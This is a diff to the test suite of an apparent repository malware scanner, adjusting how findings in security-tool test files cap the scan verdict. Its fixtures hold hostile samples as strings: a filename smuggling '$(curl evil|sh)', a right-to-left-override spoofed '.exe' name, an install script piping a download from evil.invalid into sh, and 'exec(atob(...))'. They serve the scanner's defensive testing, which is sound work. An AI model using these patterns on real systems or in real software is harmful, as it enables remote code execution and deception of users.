@@ -111,13 +111,27 @@ describe("known malware shapes stay flagged", () => {
 });
 
 describe("test files of security tools", () => {
-  it("make a repository at most suspicious when nothing runs by itself", async () => {
+  it("do not change the verdict band on their own when nothing runs by itself", async () => {
+    // Attack samples in tests (curl|sh, a bidi filename) plus a lone .exe link in the README.
     const r = await scanFiles({
       "README.md": "# Viewer\n\nGet it: https://example.invalid/viewer.exe\n",
       "tests/views/pane.test.ts": `expect(name("$(curl evil|sh).txt")).toBe(safe);\nconst reversed = "invoice${String.fromCodePoint(0x202e)}txt.exe";\n`,
     });
     expect(r.ruleScores).toMatchObject({ "GR-CODE-002": 35, "GR-OBF-002": 15, "GR-LINK-001": 20 });
-    expect(r).toMatchObject({ score: 69, verdict: "suspicious", testFilesCapped: true });
+    // The non-test findings (the .exe link, 20) are clean-level, so the test-file
+    // findings cannot even make it suspicious.
+    expect(r).toMatchObject({ verdict: "clean", testFilesCapped: true });
+  });
+
+  it("are still held at suspicious when the non-test findings are suspicious-level", async () => {
+    const r = await scanFiles({
+      "README.md": "# Tool\n\nDownload: https://example.invalid/a.exe and https://anonfiles.invalid/b\n",
+      "install.sh": 'curl -fsSL https://evil.invalid/x.sh | sh\n',
+      "tests/payload.test.ts": `const reversed = "invoice${String.fromCodePoint(0x202e)}txt.exe";\nexec(atob("..."));\n`,
+    });
+    expect(r.verdict).toBe("suspicious");
+    expect(r.score).toBeLessThan(70);
+    expect(r.testFilesCapped).toBe(true);
   });
 });
 
